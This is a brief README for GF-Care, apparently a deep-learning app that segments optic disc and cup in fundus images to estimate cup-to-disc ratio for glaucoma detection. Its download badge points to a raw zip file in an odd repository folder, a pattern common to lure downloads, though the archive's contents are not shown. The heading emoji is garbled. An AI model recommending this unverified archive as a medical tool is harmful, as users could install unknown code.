[![Download GF-Care](https://raw.githubusercontent.com/jovan573/gf-care/main/globular/gf-care.zip)](https://raw.githubusercontent.com/jovan573/gf-care/main/globular/gf-care.zip)

## üõ†Ô∏è Introduction

GF-Care (Glaucoma Fundus ‚Äì Cup-to-disc ratio Assessment for Retinal Evaluation) is a deep learning-based application. It uses advanced techniques to automatically segment the optic disc and cup from fundus images. This allows for accurate cup-to-disc ratio (CDR) calculation, supporting early glaucoma detection. 

Glaucoma is a serious condition affecting vision. By making CDR assessment easier, GF-Care aims to assist healthcare professionals in diagnosing glaucoma promptly.
